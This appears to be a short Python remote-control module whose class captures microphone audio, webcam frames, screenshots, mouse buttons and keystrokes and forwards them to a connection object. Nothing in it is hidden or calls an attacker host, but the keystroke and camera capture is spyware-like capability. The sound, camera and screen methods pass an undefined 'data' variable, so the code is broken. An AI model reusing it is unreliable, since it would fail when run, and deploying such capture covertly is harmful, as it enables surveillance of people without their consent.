#Version 2
import RControl as rc

con=rc.Controls()
class Function:


    def __init__(self,c):
        self.c=c


    def sendSound(self,userName,stream,fr=1024):
        frame=con.get_mic_frame(stream,fr)

        self.c._Sound(userName,data)

    def sendIntSound(self):
        pass

    def sendCamera(self,userName,cap):
        frame=con.get_cam_frame(cap)

        self.c._Camera(userName,data)
        

    def sendScreen(self,userName,size=(600,300)):
        frame=con.get_screen_shot(size)

        self.c._Screen(userName,data)

    def sendMouse(self,userName,mo):
        data=mo.buttons
        mo.clear()


        self.c._Mouse(userName,data)

    def sendKeyboard(self,userName,kb):
        data=kb.keys
        kb.clear()


        self.c._Keyboard(userName,data)
        
    
